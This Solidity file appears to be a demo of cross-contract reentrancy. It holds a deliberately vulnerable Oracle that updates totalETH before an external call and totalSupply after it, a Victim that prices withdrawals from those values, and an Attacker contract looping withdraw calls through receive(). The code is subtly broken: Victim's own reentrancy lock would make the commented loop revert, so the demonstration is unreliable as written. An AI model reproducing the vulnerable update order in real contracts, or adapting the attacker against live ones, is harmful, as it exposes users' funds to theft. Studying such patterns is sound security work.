// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStrategy {
    function execute() external;
}

// CONTROL FLOW: A.execute() -> LOOP { V.withdraw() -> A.receive() -> O.work() -> A.execute() -> V.withdraw() ... }


contract Victim {
    Oracle public o;
    bool private flag = false;

    constructor(address _o) {
        o = Oracle(_o);
    }

    modifier nonReentrant() {
        require(!flag, "Locked");
        flag = true;
        _;
        flag = false;
    }

    function withdraw() nonReentrant external returns (uint256) {
        uint256 rate = o.totalETHView() * 1e18 / o.totalSupplyView();
        uint256 amountETH = rate * 1000 / 1e18;

        //payable(msg.sender).transfer(amountETH);
        (bool success, ) = payable(msg.sender).call{value: amountETH}("");
        require (success, "Failed to withdraw ETH");

        return amountETH;
    }

    receive() external payable {}
}

// this is the VULNERABLE CONTRACT
contract Oracle {
    uint256 public totalETH;
    uint256 public totalSupply;

    function work(address strategy) external payable {
        totalETH += msg.value;
        IStrategy(strategy).execute();
        totalSupply += msg.value;
    }

    function totalETHView() external view returns (uint256) {
        return totalETH;
    }
    function totalSupplyView() external view returns (uint256) {
        return totalSupply;
    }
}

contract Attacker is IStrategy {
    Victim public v;
    Oracle public o;

    constructor(address payable _v, address _o) {
        v = Victim(_v);
        o = Oracle(_o);
    }

    function execute() external {
        v.withdraw();
    }

    receive() external payable {
        o.work(address(this));
    }
}